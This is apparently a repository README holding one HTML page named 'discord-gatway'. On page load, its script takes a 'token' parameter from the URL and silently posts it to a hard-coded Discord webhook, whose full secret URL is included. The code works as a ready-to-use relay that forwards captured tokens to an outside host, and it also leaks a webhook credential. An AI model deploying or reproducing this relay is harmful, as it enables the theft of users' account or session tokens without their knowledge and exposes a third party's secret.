# discord-gatway

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Post to Discord Webhook</title>
</head>
<body>
    <script>
        // Function to get query parameter by name
        function getQueryParam(name) {
            let urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        // Function to post data to Discord webhook
        function postToDiscord(token) {
            const webhookURL = "https://discord.com/api/webhooks/1255865159612891136/-t2qvz5SQt1jFIfN-otVuC08OeJB0VFTg8uOjwzmnNcJ-fL415UbxwLNBEj9lWALYbHR"; // Replace with your Discord webhook URL
            const message = {
                content: `${token}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => response.json())
            .then(data => console.log('Success:', data))
            .catch((error) => console.error('Error:', error));
        }

        // Get the token from URL and post to Discord webhook
        const token = getQueryParam('token');
        if (token) {
            postToDiscord(token);
        } else {
            console.log('Token parameter not found in the URL');
        }
    </script>
</body>
</html>
